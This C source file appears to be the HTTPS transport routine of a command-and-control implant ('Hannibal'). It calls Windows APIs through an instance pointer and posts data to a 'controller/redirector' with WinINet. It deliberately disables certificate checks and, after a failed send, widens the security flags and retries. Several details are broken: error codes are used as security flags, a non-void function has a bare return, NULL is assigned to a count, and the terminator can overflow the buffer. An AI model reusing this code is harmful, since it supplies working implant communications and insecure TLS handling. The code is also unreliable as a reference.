
#include "utility_http_wininet.h"

/**
 * @brief Uses WININET to send an HTTPS POST and receives the response. Ignores cert errors.
 * 
 * Note: You will need to ensure you free the buffer returned by this function.
 * 
 * @param[in] msg A struct containing various HTTP parameters. 
 * 
 * @return from_utility_http_wininet_msg A struct with a heap allocated buffer containing the raw response and its size.
 */
SECTION_CODE from_utility_http_wininet_msg http_wininet_request(to_utility_http_wininet_msg msg){

    HANNIBAL_INSTANCE_PTR

    DWORD SEND_TIMEOUT = 30000;
    DWORD RECEIVE_TIMEOUT = 30000;


    HINTERNET hInternet = hannibal_instance_ptr->Win32.InternetOpenW(
        msg.user_agent,
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0
    );

    // HTTPS
    HINTERNET hConnect = hannibal_instance_ptr->Win32.InternetConnectW(
		hInternet,
		msg.dst_host, // HOST
		INTERNET_DEFAULT_HTTPS_PORT,
		L"",
		L"",
		INTERNET_SERVICE_HTTP,
		0,
		0
    );

	HINTERNET hHttpFile = hannibal_instance_ptr->Win32.HttpOpenRequestW(
		hConnect,
		msg.http_method, 
		msg.dst_url,   
		NULL,
		NULL,
		NULL,
		INTERNET_FLAG_SECURE |
        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
        INTERNET_FLAG_IGNORE_CERT_CN_INVALID,
		NULL
    );

    // HTTP
    // HINTERNET hConnect = hannibal_instance_ptr->Win32.InternetConnectW(
	// 	hInternet,
	// 	msg.dst_host, // HOST
	// 	INTERNET_DEFAULT_HTTP_PORT,
	// 	L"",
	// 	L"",
	// 	INTERNET_SERVICE_HTTP,
	// 	0,
	// 	0
    // );

	// HINTERNET hHttpFile = hannibal_instance_ptr->Win32.HttpOpenRequestW(
	// 	hConnect,
    //     msg.http_method, // METHOD
	// 	msg.dst_url,   // URI
	// 	NULL,
	// 	NULL,
	// 	NULL,
	// 	NULL,
	// 	NULL
    // );

#ifdef CONFIG_CUSTOM_HEADERS
    LPCWSTR headers[] = CONFIG_CUSTOM_HEADERS;
    int header_count = sizeof(headers) / sizeof(headers[0]);

    for (int i = 0; i < header_count; i++) {
        hannibal_instance_ptr->Win32.HttpAddRequestHeadersW(hHttpFile, headers[i], -1, HTTP_ADDREQ_FLAG_ADD);
    }
#endif

    hannibal_instance_ptr->Win32.InternetSetOptionW(hHttpFile, INTERNET_OPTION_SEND_TIMEOUT, &SEND_TIMEOUT, sizeof(SEND_TIMEOUT));
    hannibal_instance_ptr->Win32.InternetSetOptionW(hHttpFile, INTERNET_OPTION_RECEIVE_TIMEOUT, &RECEIVE_TIMEOUT, sizeof(RECEIVE_TIMEOUT));

    // If controller/redirector uses self-sign cert, then bug:
    // https://learn.microsoft.com/en-us/windows/win32/winhttp/error-messages
    // https://www.betaarchive.com/wiki/index.php/Microsoft_KB_Archive/182888
    // https://www.experts-exchange.com/questions/21843991/WinInet-HTTP-SDK-have-problem-with-dealing-untrusted-root-CA-Web-Server.html
    if(!hannibal_instance_ptr->Win32.HttpSendRequestW(hHttpFile, NULL, 0, msg.content, msg.content_length)){
        
        DWORD err = hannibal_instance_ptr->Win32.GetLastError();

        DWORD dwFlags;
        DWORD dwBuffLen = sizeof(dwFlags);
        hannibal_instance_ptr->Win32.InternetQueryOptionW(hHttpFile, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&dwFlags, &dwBuffLen);

        switch (err) {
            case ERROR_INTERNET_SEC_CERT_CN_INVALID:
                dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
                break;
            case ERROR_INTERNET_SEC_CERT_DATE_INVALID:
                dwFlags |= ERROR_INTERNET_SEC_CERT_DATE_INVALID;
                break;
            case ERROR_INTERNET_INVALID_CA:
                dwFlags |= ERROR_INTERNET_INVALID_CA;
                break;
        }

        hannibal_instance_ptr->Win32.InternetSetOptionW(hHttpFile, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

        BOOL result;         
        result = hannibal_instance_ptr->Win32.HttpSendRequestW(hHttpFile, NULL, 0, msg.content, msg.content_length);

        if(!result){
            hannibal_instance_ptr->Win32.InternetCloseHandle(hHttpFile);
            hannibal_instance_ptr->Win32.InternetCloseHandle(hConnect);
            hannibal_instance_ptr->Win32.InternetCloseHandle(hInternet);

            from_utility_http_wininet_msg ret;
            ret.bytes_read = NULL;
            ret.content = NULL;

            return ret;
        }
    }

    DWORD current_buffer_size = 4096;
    LPVOID buffer = hannibal_instance_ptr->Win32.VirtualAlloc(NULL, current_buffer_size, MEM_COMMIT, PAGE_READWRITE);

    if (buffer == NULL) {
        return;
    }

    DWORD bytes_read;
    DWORD total_bytes_read = 0;
    BOOL b_read;

    while (TRUE) {
        if (total_bytes_read >= current_buffer_size) {
            DWORD new_buffer_size = current_buffer_size * 2;
            LPVOID new_buffer = hannibal_instance_ptr->Win32.VirtualAlloc(NULL, new_buffer_size, MEM_COMMIT, PAGE_READWRITE);

            if (new_buffer == NULL) {
                break;
            }

            for (DWORD i = 0; i < total_bytes_read; i++) {
                ((CHAR*)new_buffer)[i] = ((CHAR*)buffer)[i];
            }

            hannibal_instance_ptr->Win32.VirtualFree(buffer, 0, MEM_RELEASE);
            buffer = new_buffer;
            current_buffer_size = new_buffer_size; 
        }

        b_read = hannibal_instance_ptr->Win32.InternetReadFile(
            hHttpFile,
            (LPVOID)((CHAR*)buffer + total_bytes_read), // Write to the end of the currently read data
            current_buffer_size - total_bytes_read,
            &bytes_read
        );

        total_bytes_read += bytes_read;

        if (!b_read || bytes_read == 0) { // End of stream or read error
            break;
        }

    }

    ((CHAR*)buffer)[total_bytes_read] = '\0';

	hannibal_instance_ptr->Win32.InternetCloseHandle(hHttpFile);
	hannibal_instance_ptr->Win32.InternetCloseHandle(hConnect);
	hannibal_instance_ptr->Win32.InternetCloseHandle(hInternet);

    from_utility_http_wininet_msg ret;
    ret.bytes_read = total_bytes_read;
    ret.content = buffer; // Ensure this gets freed after use

    return ret;
}